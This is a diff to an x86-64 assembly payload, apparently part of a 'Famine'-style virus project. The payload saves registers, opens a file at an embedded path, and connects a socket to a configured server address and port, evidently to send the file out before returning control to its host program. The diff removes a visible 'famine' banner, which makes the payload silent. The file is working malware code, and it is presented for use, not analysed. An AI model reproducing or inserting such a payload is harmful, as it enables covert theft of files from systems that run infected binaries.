@@ -1,7 +1,6 @@
 [BITS 64]
 
 global _payload
-global _payload_size
 
 %macro pushx 1-*
 %rep %0
@@ -28,14 +27,7 @@ section .text
 
 _payload:
 	pushx rax, rdi, rsi, rdx, r10
-
-	; sys_write
-	mov rax, 1          ; syscall number for sys_write
-	mov rdi, 1          ; file descriptor (stdout)
-	lea rsi, [rel .msg]  ; pointer to message
-	mov rdx, 7          ; length of message
-	syscall
-
+	
 	; Open the file
 	mov rax, 2					; syscall number for open
 	lea rdi, [rel FILEPATH]		; filename
@@ -53,10 +45,6 @@ _payload:
 	cmp rax, -1
 	je .clean
 
-	jmp .connect
-
-.msg	db "famine", 0x0a, 0
-
 .connect:
 	; Create the socket
 	mov rax, 41					; syscall number for socket
@@ -69,11 +57,11 @@ _payload:
 	mov r13, rax
 
 	; Prepare sockaddr_in structure
-	mov word [CONNECT_BUFFER], 2			; sin_family (AF_INET)
+	mov word [CONNECT_BUFFER], 2          ; sin_family (AF_INET)
 	movzx rax, word [rel SERVER_PORT]
-	mov word [CONNECT_BUFFER + 2], ax		; sin_port
-	mov eax, [rel SERVER_ADDR]				; Load the value from memory into EAX register
-	mov dword [CONNECT_BUFFER + 4], eax		; Move the value from EAX register to the destination memory location
+	mov word [CONNECT_BUFFER + 2], ax ; sin_port
+	mov eax, [rel SERVER_ADDR] ; Load the value from memory into EAX register
+	mov dword [CONNECT_BUFFER + 4], eax ; Move the value from EAX register to the destination memory location
 	
 	; Connect the socket
 	mov rax, 42						; syscall number for connect
@@ -106,12 +94,11 @@ _payload:
 	syscall
 
 	popx rax, rdi, rsi, rdx, r10
-	; jmp     [rel 0x0]
+	; jmp     0x0
 	ret
 
-STATBUFFER:		times 144 db 0
-CONNECT_BUFFER:	times 16 db 0
-FILEPATH:		times 1024 db 0
-SERVER_PORT:	dd 0xba0b
-SERVER_ADDR:	dw 0x00000000
-_payload_size:	dq $-_payload
+STATBUFFER		times 144 db 0
+CONNECT_BUFFER	times 16 db 0
+FILEPATH		times 1024 db 0
+SERVER_PORT		dd 0x0
+SERVER_ADDR		dw 0x0
